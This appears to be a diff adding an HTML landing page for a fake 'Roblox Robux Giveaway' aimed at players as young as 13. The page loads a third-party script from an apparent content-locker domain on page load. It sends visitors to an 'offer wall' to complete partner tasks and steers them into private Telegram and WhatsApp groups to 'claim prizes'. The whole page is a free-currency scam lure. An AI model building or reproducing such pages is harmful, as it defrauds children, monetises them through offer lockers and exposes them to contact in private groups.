@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <script type="text/javascript" src="https://optilinklock.com/script_include.php?id=1860077"></script>
+
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Robux Giveaway - New Year Celebration</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #2ecc71;
+            --primary-dark: #27ae60;
+            --secondary: #3498db;
+            --accent: #f39c12;
+            --text-dark: #2c3e50;
+            --text-light: #7f8c8d;
+            --background: #f9f9f9;
+            --card-bg: #ffffff;
+            --gradient: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
+            --shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            --border-radius: 12px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--gradient);
+            color: var(--text-dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            padding-bottom: 40px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header Styles */
+        header {
+            text-align: center;
+            padding: 40px 0 30px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .logo-icon {
+            color: var(--primary);
+            font-size: 2.5rem;
+        }
+
+        h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 2.8rem;
+            color: var(--text-dark);
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: var(--text-light);
+            max-width: 700px;
+            margin: 0 auto 30px;
+        }
+
+        /* Quick Join Button */
+        .quick-join-btn {
+            display: inline-block;
+            background-color: var(--secondary);
+            color: white;
+            padding: 10px 25px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 50px;
+            text-decoration: none;
+            margin: 10px auto 30px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: none;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        .quick-join-btn:hover {
+            background-color: #2980b9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Sections Common Styles */
+        section {
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 600;
+            font-size: 1.8rem;
+            color: var(--text-dark);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        h2 i {
+            color: var(--accent);
+        }
+
+        /* Steps Section */
+        .steps-container {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .step {
+            flex: 1;
+            min-width: 250px;
+            text-align: center;
+            padding: 25px 15px;
+            background-color: #f8fafc;
+            border-radius: var(--border-radius);
+            border-top: 4px solid var(--primary);
+        }
+
+        .step-number {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            background-color: var(--primary);
+            color: white;
+            border-radius: 50%;
+            line-height: 40px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+        }
+
+        .step h3 {
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+            color: var(--text-dark);
+        }
+
+        /* Weekly Draw Section */
+        .weekly-draw {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .draw-info {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .draw-calendar {
+            display: inline-flex;
+            align-items: center;
+            background-color: #e8f4fc;
+            padding: 8px 16px;
+            border-radius: 50px;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+
+        .draw-calendar i {
+            margin-right: 8px;
+            color: var(--secondary);
+        }
+
+        /* CTA Button */
+        .cta-section {
+            text-align: center;
+            padding: 40px 30px;
+        }
+
+        .cta-button {
+            display: inline-block;
+            background-color: var(--primary);
+            color: white;
+            padding: 18px 45px;
+            font-size: 1.4rem;
+            font-weight: 600;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 4px 0 var(--primary-dark);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: none;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        .cta-button:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-3px);
+            box-shadow: 0 7px 0 var(--primary-dark);
+        }
+
+        .cta-button:active {
+            transform: translateY(1px);
+            box-shadow: 0 3px 0 var(--primary-dark);
+        }
+
+        /* Terms Section */
+        .terms {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            line-height: 1.5;
+        }
+
+        .terms ul {
+            padding-left: 20px;
+            margin-top: 10px;
+        }
+
+        .terms li {
+            margin-bottom: 8px;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            color: var(--text-light);
+            font-size: 0.9rem;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .subtitle {
+                font-size: 1.1rem;
+            }
+            
+            .steps-container {
+                flex-direction: column;
+            }
+            
+            .step {
+                min-width: 100%;
+            }
+            
+            .cta-button {
+                padding: 16px 35px;
+                font-size: 1.2rem;
+                width: 100%;
+                max-width: 350px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            h2 {
+                font-size: 1.5rem;
+            }
+            
+            section {
+                padding: 20px;
+            }
+            
+            .cta-button {
+                font-size: 1.1rem;
+                padding: 15px 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header / Main Title -->
+        <header>
+            <div class="logo-container">
+                <i class="fas fa-gift logo-icon"></i>
+            </div>
+            <h1>Roblox Robux Giveaway – Celebrate the New Year!</h1>
+            <p class="subtitle">Join our special New Year giveaway for a chance to win Robux! Participate easily and check weekly winners.</p>
+            
+            <!-- Quick Join Button -->
+            <button class="quick-join-btn" onclick="scrollToCTA()">Join</button>
+        </header>
+
+        <!-- Steps Section -->
+        <section class="steps">
+            <h2><i class="fas fa-list-ol"></i> How to Participate</h2>
+            <div class="steps-container">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>Click 'Join Giveaway'</h3>
+                    <p>Click the button below to start the process and access our secure offer wall.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>Complete Tasks</h3>
+                    <p>Follow instructions from our trusted partners to qualify for the giveaway.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>Check if You Won</h3>
+                    <p>Join our private Telegram and WhatsApp groups to see the weekly winners and claim your prize.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Weekly Draw Section -->
+        <section class="weekly-draw-section">
+            <h2><i class="fas fa-calendar-alt"></i> Weekly Draw Schedule</h2>
+            <div class="weekly-draw">
+                <div class="draw-info">
+                    <div class="draw-calendar">
+                        <i class="fas fa-calendar-check"></i>
+                        Every Friday 🎉
+                    </div>
+                    <p>Our giveaway features a weekly drawing every Friday. Winners are selected randomly from all eligible participants who completed the required tasks.</p>
+                    <p style="margin-top: 10px; font-weight: 500;">Winners are announced every Friday with proof screenshots in our private Telegram and WhatsApp groups.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Call to Action Section -->
+        <section class="cta-section" id="cta-section">
+            <h2>Ready to Win Robux?</h2>
+            <p style="margin-bottom: 30px; font-size: 1.1rem;">Join thousands of Roblox players in our New Year giveaway!</p>
+            <button class="cta-button" onclick="openLocker()">Join the Giveaway Now!</button>
+        </section>
+
+        <!-- Terms and Conditions Section -->
+        <section class="terms-section">
+            <h2><i class="fas fa-file-contract"></i> Terms & Conditions</h2>
+            <div class="terms">
+                <p>By participating in this giveaway, you agree to the following terms:</p>
+                <ul>
+                    <li>Participation requires completing partner tasks from our offer wall.</li>
+                    <li>No guaranteed Robux – winners are chosen randomly from eligible participants.</li>
+                    <li>You must be at least 13 years old to participate.</li>
+                    <li>All participants must follow Roblox Terms of Service.</li>
+                    <li>This is an unofficial giveaway not affiliated with Roblox Corporation.</li>
+                    <li>Prizes are delivered within 48 hours of winner confirmation.</li>
+                    <li>One entry per person. Duplicate accounts will be disqualified.</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer>
+            <p>This is an unofficial giveaway and is not affiliated with, sponsored, or endorsed by Roblox Corporation.</p>
+        </footer>
+    </div>
+
+    <script>
+        // JavaScript for the CTA button
+        function openLocker() {
+            // This is a placeholder function - in a real scenario, this would open an offer wall
+            alert("Offer wall will open here. In a real implementation, this would redirect to partner offers.");
+            
+            // For demonstration, we'll show a success message
+            setTimeout(() => {
+                alert("Thank you for participating! Complete the tasks to enter the giveaway. Winners are announced every Friday.");
+            }, 500);
+        }
+        
+        // Function to scroll smoothly to the CTA section
+        function scrollToCTA() {
+            const ctaSection = document.getElementById('cta-section');
+            if (ctaSection) {
+                ctaSection.scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'center'
+                });
+            }
+        }
+        
+        // Add some interactivity to step cards
+        document.addEventListener('DOMContentLoaded', function() {
+            const steps = document.querySelectorAll('.step');
+            
+            steps.forEach(step => {
+                step.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-5px)';
+                    this.style.transition = 'transform 0.3s ease';
+                });
+                
+                step.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0)';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
